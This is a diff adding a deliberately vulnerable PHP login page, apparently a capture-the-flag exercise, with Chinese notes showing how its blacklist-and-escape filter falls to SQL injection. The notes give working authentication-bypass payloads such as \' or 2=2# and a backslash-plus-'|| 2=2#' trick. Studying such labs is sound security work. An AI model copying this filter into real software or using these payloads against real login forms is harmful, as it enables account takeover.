@@ -1,0 +1,66 @@
+﻿<?php
+require('config.php');
+
+// table schema
+// user -> id, user, password, is_admin
+
+if($_GET['show_source'] === '1') {
+    highlight_file(__FILE__);
+    exit;
+}
+
+function safe_filter($str)
+{
+    $strl = strtolower($str);
+    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||
+        strstr($strl, 'update') || strstr($strl, 'delete')
+    ) {
+        return '';
+    }
+    return str_replace("'", "\\'", $str);
+}
+
+$_POST = array_map(safe_filter, $_POST);
+
+$user = null;
+
+// connect to database
+
+if(!empty($_POST['name']) && !empty($_POST['password'])) {
+    $connection_string = sprintf('mysql:host=%s;dbname=%s;charset=utf8mb4', DB_HOST, DB_NAME);
+    $db = new PDO($connection_string, DB_USER, DB_PASS);
+    $sql = sprintf("SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'",
+        $_POST['name'],
+        $_POST['password']
+    );
+    try {
+        $query = $db->query($sql);
+        if($query) {
+            $user = $query->fetchObject();
+        } else {
+            $user = false;
+        }
+    } catch(Exception $e) {
+        $user = false;
+    }
+}
+?>
+sql 注入
+输入字符		 替换后      显示字符(传入mysql)     
+     ‘  ————>  \\'  ————>      \'          
+	 SELECT * FROM `user` WHERE `user` = '\'' AND `password` = '%s'
+构造 \'
+	 \‘ ————>  \\\' ————>      \\'         
+	 SELECT * FROM `user` WHERE `user` = '\\'' AND `password` = '%s'
+	 
+构造 \' or 2=2#
+     SELECT * FROM `user` WHERE `user` = '\\' or 2=2#' AND `password` = '%s'
+显示是guest登录
+
+构造 \' or 2=2 limit 1,1#
+
+
+新 \    || 2=2#
+      SELECT * FROM `user` WHERE `user` = '\' AND `password` = '|| 2=2#'
+
+
